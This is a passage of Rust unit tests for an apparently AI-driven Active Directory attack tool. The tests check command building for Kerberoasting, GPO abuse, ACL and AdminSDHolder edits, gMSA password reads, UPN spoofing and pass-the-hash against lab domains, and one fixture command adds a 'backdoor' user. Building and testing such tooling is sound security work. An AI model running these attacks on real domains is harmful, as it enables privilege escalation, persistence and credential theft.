    }

    #[test]
    fn targeted_kerberoast_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_user": "svc_sql"
        });
        assert_eq!(required_str(&args, "target_user").unwrap(), "svc_sql");
    }

    // ── sharpgpoabuse arg validation ───────────────────────────────────

    #[test]
    fn sharpgpoabuse_default_action() {
        let args = json!({
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let action = optional_str(&args, "action").unwrap_or("AddLocalAdmin");
        assert_eq!(action, "AddLocalAdmin");
        let action_flag = format!("--{action}");
        assert_eq!(action_flag, "--AddLocalAdmin");
    }

    #[test]
    fn sharpgpoabuse_user_to_add_default_fallback() {
        let args = json!({
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let user_to_add = optional_str(&args, "user_to_add").unwrap_or(username);
        assert_eq!(user_to_add, "admin");
    }

    #[test]
    fn sharpgpoabuse_explicit_user_to_add() {
        let args = json!({
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "user_to_add": "jsmith"
        });
        let username = required_str(&args, "username").unwrap();
        let user_to_add = optional_str(&args, "user_to_add").unwrap_or(username);
        assert_eq!(user_to_add, "jsmith");
    }

    #[test]
    fn sharpgpoabuse_computer_target_optional() {
        let args = json!({
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "computer_target": "ws01.contoso.local"
        });
        assert_eq!(
            optional_str(&args, "computer_target"),
            Some("ws01.contoso.local")
        );
    }

    #[test]
    fn sharpgpoabuse_computer_target_absent() {
        let args = json!({
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(optional_str(&args, "computer_target").is_none());
    }

    // ── pygpoabuse_immediate_task arg validation ───────────────────────

    #[test]
    fn pygpoabuse_default_taskname() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "gpo_id": "{6AC1786C-016F-11D2-945F-00C04fB984F9}",
            "command": "net user backdoor P@ssw0rd! /add",
            "dc_ip": "192.168.58.10"
        });
        let task_name = optional_str(&args, "task_name").unwrap_or("WindowsUpdate");
        assert_eq!(task_name, "WindowsUpdate");
    }

    #[test]
    fn pygpoabuse_default_force() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "gpo_id": "{6AC1786C-016F-11D2-945F-00C04fB984F9}",
            "command": "whoami",
            "dc_ip": "192.168.58.10"
        });
        let force = optional_bool(&args, "force").unwrap_or(true);
        assert!(force);
    }

    #[test]
    fn pygpoabuse_force_false() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "gpo_id": "{6AC1786C-016F-11D2-945F-00C04fB984F9}",
            "command": "whoami",
            "dc_ip": "192.168.58.10",
            "force": false
        });
        let force = optional_bool(&args, "force").unwrap_or(true);
        assert!(!force);
    }

    #[test]
    fn pygpoabuse_missing_gpo_id() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "command": "whoami",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "gpo_id").is_err());
    }

    // ── dacl_edit arg validation ───────────────────────────────────────

    #[test]
    fn dacl_edit_default_action() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith",
            "rights": "FullControl",
            "target_dn": "CN=Users,DC=contoso,DC=local"
        });
        let action = optional_str(&args, "action").unwrap_or("write");
        assert_eq!(action, "write");
    }

    #[test]
    fn dacl_edit_custom_action() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith",
            "rights": "FullControl",
            "target_dn": "CN=Users,DC=contoso,DC=local",
            "action": "restore"
        });
        let action = optional_str(&args, "action").unwrap_or("write");
        assert_eq!(action, "restore");
    }

    #[test]
    fn dacl_edit_missing_rights() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith",
            "target_dn": "CN=Users,DC=contoso,DC=local"
        });
        assert!(required_str(&args, "rights").is_err());
    }

    #[test]
    fn dacl_edit_missing_principal() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "rights": "FullControl",
            "target_dn": "CN=Users,DC=contoso,DC=local"
        });
        assert!(required_str(&args, "principal").is_err());
    }

    // ── credential helper integration ──────────────────────────────────

    #[test]
    fn bloodyad_creds_format() {
        let creds =
            credentials::bloodyad_creds("contoso.local", "admin", "P@ssw0rd!", "192.168.58.10");
        assert_eq!(
            creds,
            vec![
                "-d",
                "contoso.local",
                "-u",
                "admin",
                "-p",
                "P@ssw0rd!",
                "--host",
                "192.168.58.10"
            ]
        );
    }

    #[test]
    fn impacket_target_with_domain_and_password() {
        let target = credentials::impacket_target(
            Some("contoso.local"),
            "admin",
            Some("P@ssw0rd!"),
            "contoso.local",
        );
        assert_eq!(target, "contoso.local/admin:P@ssw0rd!@contoso.local");
    }

    #[test]
    fn impacket_target_without_password() {
        let target =
            credentials::impacket_target(Some("contoso.local"), "admin", None, "contoso.local");
        assert_eq!(target, "contoso.local/admin@contoso.local");
    }

    #[test]
    fn impacket_target_without_domain() {
        let target =
            credentials::impacket_target(None, "admin", Some("P@ssw0rd!"), "192.168.58.10");
        assert_eq!(target, "admin:P@ssw0rd!@192.168.58.10");
    }

    // ── domain_to_base_dn edge cases ──────────────────────────────────

    #[test]
    fn domain_to_base_dn_empty_string() {
        assert_eq!(domain_to_base_dn(""), "DC=");
    }

    #[test]
    fn domain_to_base_dn_child_domain() {
        assert_eq!(
            domain_to_base_dn("child.contoso.local"),
            "DC=child,DC=contoso,DC=local"
        );
    }

    // ── adminsd_holder_dn with nested domains ─────────────────────────

    #[test]
    fn adminsd_holder_dn_nested_domain() {
        let base_dn = domain_to_base_dn("child.contoso.local");
        let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");
        assert_eq!(
            adminsd_dn,
            "CN=AdminSDHolder,CN=System,DC=child,DC=contoso,DC=local"
        );
    }

    // ── sharpgpoabuse action_flag formatting ──────────────────────────

    #[test]
    fn sharpgpoabuse_custom_action_flag() {
        let args = json!({
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "action": "AddComputerTask"
        });
        let action = optional_str(&args, "action").unwrap_or("AddLocalAdmin");
        let action_flag = format!("--{action}");
        assert_eq!(action_flag, "--AddComputerTask");
    }

    // --- mock executor tests: exercise full CommandBuilder code paths ---

    use crate::executor::mock;

    #[tokio::test]
    async fn bloodyad_add_group_member_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "username": "admin", "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.1", "group": "Domain Admins", "target_user": "jsmith"
        });
        assert!(super::bloodyad_add_group_member(&args).await.is_ok());
    }

    #[tokio::test]
    async fn bloodyad_set_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "username": "admin", "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.1", "target_user": "victim", "new_password": "NewP@ss!"
        });
        assert!(super::bloodyad_set_password(&args).await.is_ok());
    }

    #[tokio::test]
    async fn bloodyad_set_password_kerberos_mode_executes() {
        // When ticket_path is supplied, bloodyAD should be invoked with -k -K
        // rather than username/password. This verifies the Kerberos branch of
        // bloodyad_set_password builds a valid command without erroring out.
        mock::push(mock::success());
        let args = json!({
            "domain": "fabrikam.local",
            "dc_ip": "192.168.58.20",
            "target_user": "svc_exploit",
            "new_password": "NewP@ss!99",
            "ticket_path": "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache"
        });
        assert!(super::bloodyad_set_password(&args).await.is_ok());
    }

    #[tokio::test]
    async fn bloodyad_set_password_kerberos_missing_creds_still_needs_new_password() {
        // ticket_path branch still requires new_password.
        let args = json!({
            "domain": "fabrikam.local",
            "dc_ip": "192.168.58.20",
            "target_user": "svc_exploit",
            "ticket_path": "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache"
            // new_password deliberately absent
        });
        assert!(required_str(&args, "new_password").is_err());
    }

    #[tokio::test]
    async fn bloodyad_add_genericall_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "username": "admin", "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.1", "target_dn": "CN=Users,DC=contoso,DC=local", "principal": "jsmith"
        });
        assert!(super::bloodyad_add_genericall(&args).await.is_ok());
    }

    #[tokio::test]
    async fn bloodyad_set_object_attr_executes() {
        mock::push(mock::success());
        // ESC9-style invocation: spoof a victim user's UPN to the
        // built-in administrator so a certipy-issued cert authenticates
        // as administrator.
        let args = json!({
            "domain": "contoso.local",
            "username": "alice",
            "password": "P@ssw0rd!",   // pragma: allowlist secret
            "dc_ip": "192.168.58.10",
            "target": "victim_user",
            "attribute": "userPrincipalName",
            "value": "administrator@contoso.local"
        });
        assert!(super::bloodyad_set_object_attr(&args).await.is_ok());
    }

    #[test]
    fn bloodyad_set_object_attr_requires_all_fields() {
        // Each missing field should error — confirms the schema is enforced
        // at the implementation level (defence in depth against the LLM
        // omitting fields the JSON schema also requires).
        for field in &[
            "domain",
            "username",
            "dc_ip",
            "target",
            "attribute",
            "value",
        ] {
            let mut args = json!({
                "domain": "contoso.local",
                "username": "alice",
                "password": "P@ssw0rd!",   // pragma: allowlist secret
                "dc_ip": "192.168.58.10",
                "target": "victim_user",
                "attribute": "userPrincipalName",
                "value": "administrator@contoso.local"
            });
            args.as_object_mut().unwrap().remove(*field);
            assert!(
                super::build_bloodyad_set_object_attr(&args).is_err(),
                "expected build_bloodyad_set_object_attr to reject missing {field}"
            );
        }
    }

    #[tokio::test]
    async fn adminsd_holder_add_ace_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "username": "admin", "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.1", "principal": "jsmith"
        });
        assert!(super::adminsd_holder_add_ace(&args).await.is_ok());
    }

    #[tokio::test]
    async fn gmsa_read_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "username": "admin", "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.1", "gmsa_account": "svc_web$"
        });
        assert!(super::gmsa_read_password_bloodyad(&args).await.is_ok());
    }

    #[tokio::test]
    async fn pywhisker_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "username": "admin", "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.1", "target_samaccountname": "dc01$"
        });
        assert!(super::pywhisker(&args).await.is_ok());
    }

    #[tokio::test]
    async fn targeted_kerberoast_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "username": "admin", "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.1", "target_user": "svc_sql"
        });
        assert!(super::targeted_kerberoast(&args).await.is_ok());
    }

    #[tokio::test]
    async fn sharpgpoabuse_executes() {
        mock::push(mock::success());
        let args = json!({
            "gpo_name": "Default Domain Policy", "domain": "contoso.local",
            "username": "admin", "password": "P@ssw0rd!", "dc_ip": "192.168.58.1"
        });
        assert!(super::sharpgpoabuse(&args).await.is_ok());
    }

    #[tokio::test]
    async fn pygpoabuse_immediate_task_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "username": "admin", "password": "P@ssw0rd!",
            "gpo_id": "{6AC1786C}", "command": "whoami", "dc_ip": "192.168.58.1"
        });
        assert!(super::pygpoabuse_immediate_task(&args).await.is_ok());
    }

    #[tokio::test]
    async fn dacl_edit_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "username": "admin", "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.1", "principal": "jsmith", "rights": "FullControl",
            "target_dn": "CN=Users,DC=contoso,DC=local"
        });
        assert!(super::dacl_edit(&args).await.is_ok());
    }

    // ── Bug B: ticket_path → KRB5CCNAME env wiring ──────────────────────

    #[test]
    fn bloodyad_set_password_invocation_receives_krb5ccname_env() {
        let args = json!({
            "domain": "fabrikam.local",
            "dc_ip": "192.168.58.20",
            "target_user": "svc_exploit",
            "new_password": "NewP@ss!99",
            "ticket_path": "/tmp/ares-tickets/contoso__fabrikam__Administrator.ccache",
        });
        let cmd = super::build_bloodyad_set_password(&args).unwrap();
        assert!(
            cmd.env_vars_for_test()
                .iter()
                .any(|(k, v)| k == "KRB5CCNAME"
                    && v == "/tmp/ares-tickets/contoso__fabrikam__Administrator.ccache"),
            "KRB5CCNAME must reach the bloodyAD subprocess when ticket_path is supplied"
        );
        let args_vec = cmd.args_for_test();
        assert!(args_vec.iter().any(|a| a == "-k"), "expected -k flag");
        // bloodyAD's `-k` is variadic; the ccache reaches it as `ccache=<path>`.
        // `-K` is NOT a valid bloodyAD arg — regression guard against the
        // wedge that corrupted argv into an "invalid choice" subcommand error.
        assert!(
            args_vec
                .iter()
                .any(|a| a == "ccache=/tmp/ares-tickets/contoso__fabrikam__Administrator.ccache"),
            "expected `-k ccache=<path>` form; got args: {args_vec:?}"
        );
        assert!(
            !args_vec.iter().any(|a| a == "-K"),
            "`-K` is not a real bloodyAD flag; must not appear in argv"
        );
    }

    #[test]
    fn bloodyad_add_group_member_invocation_receives_krb5ccname_env() {
        let args = json!({
            "domain": "fabrikam.local",
            "dc_ip": "192.168.58.20",
            "group": "Domain Admins",
            "target_user": "alice",
            "ticket_path": "/tmp/ares-tickets/x.ccache",
        });
        let cmd = super::build_bloodyad_add_group_member(&args).unwrap();
        assert!(
            cmd.env_vars_for_test()
                .iter()
                .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/x.ccache"),
            "ticket_path must export KRB5CCNAME for bloodyad_add_group_member"
        );
        let args_vec = cmd.args_for_test();
        assert!(
            args_vec.iter().any(|a| a == "-k"),
            "expected bloodyAD -k flag for Kerberos auth"
        );
        assert!(
            args_vec
                .iter()
                .any(|a| a == "ccache=/tmp/ares-tickets/x.ccache"),
            "expected `-k ccache=<path>` (bloodyAD's variadic keyword form), \
             not `-K <path>` which bloodyAD rejects"
        );
        assert!(
            !args_vec.iter().any(|a| a == "-K"),
            "`-K` is not a real bloodyAD flag"
        );
    }

    #[test]
    fn bloodyad_add_group_member_password_branch_unchanged() {
        // Sanity: without ticket_path the legacy NTLM bind args are still
        // produced. Regression guard for the conditional in
        // build_bloodyad_add_group_member.
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.1",
            "group": "Domain Admins",
            "target_user": "alice",
        });
        let cmd = super::build_bloodyad_add_group_member(&args).unwrap();
        assert!(
            cmd.env_vars_for_test()
                .iter()
                .all(|(k, _)| k != "KRB5CCNAME"),
            "NTLM-bind branch must not export KRB5CCNAME"
        );
        let args_vec = cmd.args_for_test();
        assert!(args_vec.iter().any(|a| a == "-u"));
        assert!(args_vec.iter().any(|a| a == "-p"));
    }

    #[test]
    fn bloodyad_add_genericall_invocation_receives_krb5ccname_env() {
        let args = json!({
            "domain": "fabrikam.local",
            "dc_ip": "192.168.58.20",
            "target_dn": "CN=Users,DC=fabrikam,DC=local",
            "principal": "alice",
            "ticket_path": "/tmp/ares-tickets/y.ccache",
        });
        let cmd = super::build_bloodyad_add_genericall(&args).unwrap();
        assert!(
            cmd.env_vars_for_test()
                .iter()
                .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/y.ccache"),
            "ticket_path must export KRB5CCNAME for bloodyad_add_genericall"
        );
        let args_vec = cmd.args_for_test();
        assert!(args_vec.iter().any(|a| a == "-k"));
        assert!(
            args_vec
                .iter()
                .any(|a| a == "ccache=/tmp/ares-tickets/y.ccache"),
            "expected `-k ccache=<path>`; got args: {args_vec:?}"
        );
        assert!(
            !args_vec.iter().any(|a| a == "-K"),
            "`-K` is not a real bloodyAD flag"
        );
    }

    // ── Bug E: etype_hint consumption ───────────────────────────────────

    #[test]
    fn targeted_kerberoast_passes_etype_hint_to_underlying_binary() {
        let args = json!({
            "domain": "fabrikam.local",
            "username": "carol",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.20",
            "target_user": "sql_svc",
            "etype_hint": ["aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96"],
        });
        let cmd = super::build_targeted_kerberoast(&args).unwrap();
        let args_vec = cmd.args_for_test();
        // AES256(0x10) | AES128(0x08) = 24
        let mask_idx = args_vec
            .iter()
            .position(|a| a == "-supported-enctypes")
            .expect("etype_hint must produce -supported-enctypes flag");
        assert_eq!(
            args_vec.get(mask_idx + 1).map(String::as_str),
            Some("24"),
            "AES256+AES128 etype_hint must serialize to the msDS-SupportedEncryptionTypes \
             bitmask value 24 (0x18) so impacket-GetUserSPNs requests AES-only TGS"
        );
        assert!(
            args_vec.iter().any(|a| a == "-request-user"),
            "expected -request-user flag to scope the kerberoast"
        );
    }

    #[test]
    fn targeted_kerberoast_without_etype_hint_falls_back_to_targetedkerberoast_py() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.1",
            "target_user": "svc_sql",
        });
        let cmd = super::build_targeted_kerberoast(&args).unwrap();
        // The legacy `-t` flag is targetedKerberoast.py's per-user selector;
        // impacket-GetUserSPNs uses `-request-user` instead. Either presence
        // is sufficient to confirm the fallback path is reached, but the -t
        // flag pins the implementation choice when no etype_hint is set.
        let args_vec = cmd.args_for_test();
        assert!(
            args_vec.iter().any(|a| a == "-t"),
            "no etype_hint → must invoke targetedKerberoast.py (-t flag)"
        );
        assert!(
            args_vec.iter().all(|a| a != "-supported-enctypes"),
            "no etype_hint → must NOT pass -supported-enctypes"
        );
    }

    // ── hash / ticket_path auth for pywhisker & targeted_kerberoast ───────

    #[test]
    fn pywhisker_ticket_path_sets_krb5ccname_and_no_pass() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "target_samaccountname": "dc01$",
            "ticket_path": "/tmp/ares-tickets/admin.ccache",
        });
        let cmd = super::build_pywhisker(&args).unwrap();
        let args_vec = cmd.args_for_test();
        assert!(args_vec.iter().any(|a| a == "-k"));
        assert!(args_vec.iter().any(|a| a == "--no-pass"));
        assert!(args_vec.iter().all(|a| a != "-p"));
        assert!(cmd
            .env_vars_for_test()
            .iter()
            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/admin.ccache"));
    }

    #[test]
    fn pywhisker_hash_uses_hashes_flag() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "target_samaccountname": "dc01$",
            "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        });
        let cmd = super::build_pywhisker(&args).unwrap();
        let args_vec = cmd.args_for_test();
        let idx = args_vec
            .iter()
            .position(|a| a == "--hashes")
            .expect("--hashes flag required for pass-the-hash");
        assert_eq!(
            args_vec.get(idx + 1).map(String::as_str),
            Some(":aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
            "NT-only hash must be prefixed with ':'"
        );
        // `--no-pass` must NOT accompany `--hashes`: pywhisker groups its auth
        // flags as argparse mutually-exclusive, so the pair aborts with
        // "argument --no-pass: not allowed with -H/--hashes" and the tool never
        // runs. Every pass-the-hash pywhisker call failed this way.
        assert!(
            args_vec.iter().all(|a| a != "--no-pass"),
            "--no-pass is mutually exclusive with --hashes"
        );
        assert!(args_vec.iter().all(|a| a != "-p"));
    }

    #[test]
    fn pywhisker_hash_preserves_lm_nt_form() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "target_samaccountname": "dc01$",
            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
        });
        let cmd = super::build_pywhisker(&args).unwrap();
        let args_vec = cmd.args_for_test();
        let idx = args_vec.iter().position(|a| a == "--hashes").unwrap();
        assert_eq!(
            args_vec.get(idx + 1).map(String::as_str),
            Some("aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"),
        );
    }

    #[test]
    fn pywhisker_password_branch_still_works() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_samaccountname": "dc01$",
        });
        let cmd = super::build_pywhisker(&args).unwrap();
        let args_vec = cmd.args_for_test();
        assert!(args_vec.iter().any(|a| a == "-p"));
        assert!(args_vec.iter().all(|a| a != "--hashes"));
        assert!(args_vec.iter().all(|a| a != "-k"));
    }

    #[test]
    fn pywhisker_missing_all_auth_errors() {
        // No password, no hash, no ticket_path → password required error.
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "target_samaccountname": "dc01$",
        });
        assert!(super::build_pywhisker(&args).is_err());
    }

    #[test]
    fn targeted_kerberoast_no_etype_ticket_path_sets_kerberos_env() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "target_user": "svc_sql",
            "ticket_path": "/tmp/ares-tickets/admin.ccache",
        });
        let cmd = super::build_targeted_kerberoast(&args).unwrap();
        let args_vec = cmd.args_for_test();
        // No-etype branch uses targetedKerberoast.py (-t flag present).
        assert!(args_vec.iter().any(|a| a == "-t"));
        assert!(args_vec.iter().any(|a| a == "-k"));
        assert!(args_vec.iter().any(|a| a == "-no-pass"));
        assert!(args_vec.iter().all(|a| a != "-p"));
        assert!(cmd
            .env_vars_for_test()
            .iter()
            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/admin.ccache"));
    }

    #[test]
    fn targeted_kerberoast_no_etype_hash_uses_capital_h() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "target_user": "svc_sql",
            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
        });
        let cmd = super::build_targeted_kerberoast(&args).unwrap();
        let args_vec = cmd.args_for_test();
        // targetedKerberoast.py uses `-H` (single-dash impacket style) for hashes.
        let idx = args_vec.iter().position(|a| a == "-H").unwrap();
        assert_eq!(
            args_vec.get(idx + 1).map(String::as_str),
            Some(":31d6cfe0d16ae931b73c59d7e0c089c0"),
        );
        assert!(args_vec.iter().any(|a| a == "-no-pass"));
        assert!(args_vec.iter().all(|a| a != "-p"));
    }

    #[test]
    fn targeted_kerberoast_etype_ticket_path_sets_kerberos_env() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "target_user": "svc_sql",
            "ticket_path": "/tmp/ares-tickets/admin.ccache",
            "etype_hint": ["aes256-cts-hmac-sha1-96"],
        });
        let cmd = super::build_targeted_kerberoast(&args).unwrap();
        let args_vec = cmd.args_for_test();
        assert!(args_vec.iter().any(|a| a == "-supported-enctypes"));
        assert!(args_vec.iter().any(|a| a == "-k"));
        assert!(args_vec.iter().any(|a| a == "-no-pass"));
        assert!(cmd
            .env_vars_for_test()
            .iter()
            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/admin.ccache"));
        // Target string with no password (Kerberos path).
        assert!(
            args_vec
                .iter()
                .any(|a| a == "contoso.local/admin@192.168.58.10"),
            "impacket target must be built without password for Kerberos auth; got: {args_vec:?}"
        );
    }

    #[test]
    fn targeted_kerberoast_etype_hash_uses_hashes_flag() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "target_user": "svc_sql",
            "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "etype_hint": ["aes256-cts-hmac-sha1-96"],
        });
        let cmd = super::build_targeted_kerberoast(&args).unwrap();
        let args_vec = cmd.args_for_test();
        assert!(args_vec.iter().any(|a| a == "-supported-enctypes"));
        // impacket-GetUserSPNs uses `-hashes` (single-dash) for PtH.
        let idx = args_vec.iter().position(|a| a == "-hashes").unwrap();
        assert_eq!(
            args_vec.get(idx + 1).map(String::as_str),
            Some(":aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
        );
        assert!(args_vec.iter().any(|a| a == "-no-pass"));
    }

    #[test]
    fn targeted_kerberoast_missing_all_auth_errors() {
        // No etype, no password/hash/ticket → error.
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "target_user": "svc_sql",
        });
        assert!(super::build_targeted_kerberoast(&args).is_err());
    }

    #[test]
    fn etype_hint_bitmask_handles_unknown_etypes() {
        let args = json!({
            "etype_hint": ["unknown-cipher", "aes256-cts-hmac-sha1-96"],
        });
        let mask = super::etype_hint_bitmask(&args).unwrap();
        assert_eq!(mask, 0x10, "only the known AES256 bit should be set");
    }

    #[test]
    fn etype_hint_bitmask_none_when_array_missing() {
        let args = json!({"foo": "bar"});
        assert!(super::etype_hint_bitmask(&args).is_none());
    }

    #[test]
    fn etype_hint_bitmask_none_when_all_unknown() {
        let args = json!({"etype_hint": ["completely-bogus"]});
        assert!(super::etype_hint_bitmask(&args).is_none());
    }

    // ── hash / ticket auth for the bloodyAD + dacledit family ───────────

    const NT: &str = "0123456789abcdef0123456789abcdef";
    const LM: &str = "fedcba9876543210fedcba9876543210";

    /// Value that follows `flag` in the built argv, if present.
    fn flag_value<'a>(argv: &'a [String], flag: &str) -> Option<&'a str> {
        let idx = argv.iter().position(|a| a == flag)?;
        argv.get(idx + 1).map(String::as_str)
    }

    fn with_arg(base: &Value, key: &str, value: &str) -> Value {
        let mut args = base.clone();
        args.as_object_mut()
            .unwrap()
            .insert(key.to_string(), Value::String(value.to_string()));
        args
    }

    type Builder = fn(&Value) -> Result<CommandBuilder>;

    /// Every bloodyAD-backed ACL tool paired with its non-auth arguments.
    fn bloodyad_tool_cases() -> Vec<(&'static str, Value, Builder)> {
        vec![
            (
                "bloodyad_add_group_member",
                json!({
                    "domain": "contoso.local", "username": "alice",
                    "dc_ip": "192.168.58.10", "group": "Domain Admins",
                    "target_user": "bob"
                }),
                super::build_bloodyad_add_group_member as Builder,
            ),
            (
                "bloodyad_set_password",
                json!({
                    "domain": "contoso.local", "username": "alice",
                    "dc_ip": "192.168.58.10", "target_user": "bob",
                    "new_password": "NewP@ss123!"
                }),
                super::build_bloodyad_set_password as Builder,
            ),
            (
                "bloodyad_add_genericall",
                json!({
                    "domain": "contoso.local", "username": "alice",
                    "dc_ip": "192.168.58.10",
                    "target_dn": "CN=bob,CN=Users,DC=contoso,DC=local",
                    "principal": "alice"
                }),
                super::build_bloodyad_add_genericall as Builder,
            ),
            (
                "bloodyad_set_object_attr",
                json!({
                    "domain": "contoso.local", "username": "alice",
                    "dc_ip": "192.168.58.10", "target": "bob",
                    "attribute": "userPrincipalName",
                    "value": "administrator@contoso.local"
                }),
                super::build_bloodyad_set_object_attr as Builder,
            ),
            (
                "adminsd_holder_add_ace",
                json!({
                    "domain": "contoso.local", "username": "alice",
                    "dc_ip": "192.168.58.10", "principal": "bob"
                }),
                super::build_adminsd_holder_add_ace as Builder,
            ),
            (
                "gmsa_read_password_bloodyad",
                json!({
                    "domain": "contoso.local", "username": "alice",
                    "dc_ip": "192.168.58.10", "gmsa_account": "svc_web$"
                }),
                super::build_gmsa_read_password_bloodyad as Builder,
            ),
        ]
    }

    #[test]
    fn bloodyad_hash_normalizes_to_lm_nt_password_flag() {
        let expected_empty_lm = format!("aad3b435b51404eeaad3b435b51404ee:{NT}");
        let cases: Vec<(&str, String, String)> = vec![
            ("hash", NT.to_string(), expected_empty_lm.clone()),
            ("hash", format!("{LM}:{NT}"), format!("{LM}:{NT}")),
            ("hash", format!(":{NT}"), expected_empty_lm.clone()),
            ("hash", format!("  {NT}  "), expected_empty_lm.clone()),
            ("nt_hash", NT.to_string(), expected_empty_lm.clone()),
            ("ntlm_hash", NT.to_string(), expected_empty_lm),
        ];

        let base = json!({
            "domain": "contoso.local", "username": "alice",
            "dc_ip": "192.168.58.10", "group": "Domain Admins",
            "target_user": "bob"
        });
        for (key, raw, expected) in cases {
            let cmd = super::build_bloodyad_add_group_member(&with_arg(&base, key, &raw)).unwrap();
            let argv = cmd.args_for_test();
            assert_eq!(
                flag_value(argv, "-p"),
                Some(expected.as_str()),
                "{key}={raw} must reach bloodyAD as -p LMHASH:NTHASH"
            );
            assert_eq!(flag_value(argv, "-u"), Some("alice"));
            assert_eq!(flag_value(argv, "-d"), Some("contoso.local"));
            assert_eq!(flag_value(argv, "--host"), Some("192.168.58.10"));
            assert!(
                argv.iter().all(|a| a != "-k"),
                "hash auth must not select the Kerberos branch"
            );
            assert!(cmd
                .env_vars_for_test()
                .iter()
                .all(|(k, _)| k != "KRB5CCNAME"));
        }
    }

    #[test]
    fn bloodyad_malformed_hash_rejected() {
        let base = json!({
            "domain": "contoso.local", "username": "alice",
            "dc_ip": "192.168.58.10", "group": "Domain Admins",
            "target_user": "bob"
        });
        for raw in [
            "not-a-hash",
            "0123456789abcdef",
            "0123456789abcdef0123456789abcde",
